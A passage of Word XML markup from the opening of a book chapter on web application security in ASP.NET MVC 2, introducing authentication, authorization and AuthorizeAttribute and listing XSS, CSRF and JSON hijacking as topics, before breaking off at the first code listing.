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CC071C" w:rsidP="00491541">
      <w:pPr>
        <w:pStyle w:val="COChapterNumber"/>
      </w:pPr>
      <w:r>
        <w:t>11</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC071C" w:rsidRDefault="00CC071C" w:rsidP="00CC071C">
      <w:pPr>
        <w:pStyle w:val="COChapterTitle"/>
      </w:pPr>
      <w:r>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002E4FA2">
        <w:instrText>Security</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00025E13" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>This c</w:t>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t>hapter covers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Requiring authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="0019098A" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Preventing</w:t>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cross site s</w:t>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t>cripting</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00AC59FB">
        <w:instrText>cross site scripting</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t xml:space="preserve"> attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="0019098A" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mitigating cross site request f</w:t>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t>orgeries</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="009E784A">
        <w:instrText>cross site request forgeries</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="0019098A" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Avoiding JSON</w:t>
      </w:r>
      <w:ins w:id="0" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="1" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="2" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> h</w:t>
      </w:r>
      <w:r w:rsidR="00C24DDD">
        <w:t>ijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C15A8" w:rsidRDefault="009B2B81" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002E4FA2">
        <w:instrText>Security</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is often a vague an amorphous topic in web application development.  We rely on the web server to keep our application secure, and we rely on our programming platform.  The rest sometimes seems very theoretical and rare.  In this chapter, we will show real possible attacks and exactly what to do to prevent them by using two main </w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t>aspects.  The first is traditional management of authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve"> and authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="001D6E79" w:rsidRPr="009574DB">
        <w:rPr>
          <w:rStyle w:val="Italics"/>
        </w:rPr>
        <w:t>Authentication</w:t>
      </w:r>
      <w:r w:rsidR="00025E13">
        <w:t xml:space="preserve"> is ensuring that</w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve"> the user has supplied the proper credentials to access the system.  When a user logs in, usually by providing a username and password, </w:t>
      </w:r>
      <w:r w:rsidR="00524056">
        <w:t>he</w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve"> is authenticated.  </w:t>
      </w:r>
      <w:r w:rsidR="001D6E79" w:rsidRPr="009574DB">
        <w:rPr>
          <w:rStyle w:val="Italics"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve"> is making a decision about whether a given user has permission to do something with the system.  When a user accesses a resource not available to other users,</w:t>
      </w:r>
      <w:r w:rsidR="006D600C">
        <w:t xml:space="preserve"> he</w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t xml:space="preserve"> has been specifically authorized to do so.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D6E79" w:rsidRDefault="001D6E79" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>The second aspect we'll discuss involve</w:t>
      </w:r>
      <w:r w:rsidR="00025E13">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> common web attack</w:t>
      </w:r>
      <w:ins w:id="3" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="4" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="5" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> vectors and technical vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="007305C4">
        <w:instrText>vulnerabilities</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that allow attackers to bypass authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>.  There are several attack vectors, but we'll focus on some common ones: cross-site scripting (XSS</w:t>
      </w:r>
      <w:ins w:id="6" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="7" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="8" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>), cross-site request forgery</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00E8467D">
        <w:instrText>request forgery</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (CSRF), and a special cross-site request forgery called JSON</w:t>
      </w:r>
      <w:ins w:id="9" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="10" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="11" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> hijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC071C" w:rsidRDefault="00CC071C" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">11.1 </w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t>Authentication and a</w:t>
      </w:r>
      <w:r w:rsidR="004D5449">
        <w:t>uthorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="00307203" w:rsidRDefault="004D5449" w:rsidP="000968D7">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>ASP.NET MVC 2 ships with a filter attribute</w:t>
      </w:r>
      <w:r w:rsidR="000968D7">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="000968D7">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that provides out of the box authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>.  Developers can apply the attribute to actions to restrict access to them</w:t>
      </w:r>
      <w:commentRangeStart w:id="12"/>
      <w:commentRangeStart w:id="13"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:t xml:space="preserve">  If the user is not permitted</w:t>
      </w:r>
      <w:r w:rsidR="000968D7">
        <w:t xml:space="preserve"> to access the action then the</w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00307203" w:rsidRPr="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:t xml:space="preserve"> will transmit an HTTP status code of </w:t>
      </w:r>
      <w:r w:rsidR="00307203" w:rsidRPr="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>401</w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unauthorized</w:t>
      </w:r>
      <w:r w:rsidR="000968D7">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00795971" w:rsidRPr="00795971">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>to the browser</w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00307203" w:rsidRPr="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> indicating that the request has been refused</w:t>
      </w:r>
      <w:r w:rsidR="00307203" w:rsidRPr="00307203">
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:commentRangeEnd w:id="12"/>
      <w:r w:rsidR="000968D7">
        <w:commentReference w:id="12"/>
      </w:r>
      <w:commentRangeEnd w:id="13"/>
      <w:r w:rsidR="00506E62">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="13"/>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:t>Applications using ASP.NET's forms authentication</w:t>
      </w:r>
      <w:ins w:id="14" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="001149C4">
        <w:rPr>
          <w:rPrChange w:id="15" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>forms authentication</w:instrText>
      </w:r>
      <w:ins w:id="16" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00307203">
        <w:t xml:space="preserve"> mechanism </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve">and with a login page specified in </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Web.config</w:t>
      </w:r>
      <w:ins w:id="17" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00C0652F">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="18" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Web.config</w:instrText>
      </w:r>
      <w:ins w:id="19" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00307203">
        <w:t>will then redirect the browser to the login page, and the user may only proceed once they have been authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.1 Requiring authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The simplest use of the </w:t>
      </w:r>
      <w:r w:rsidR="00705E20" w:rsidRPr="00705E20">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="009574DB">
        <w:t>, shown in listing 11.1,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> only requires that the </w:t>
      </w:r>
      <w:r w:rsidR="009574DB">
        <w:t xml:space="preserve">current </w:t>
      </w:r>
      <w:r>
        <w:t>user be authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.1 Authentication with the AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>[Authorize</w:t>
      </w:r>
      <w:ins w:id="20" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="004B5146">
        <w:rPr>
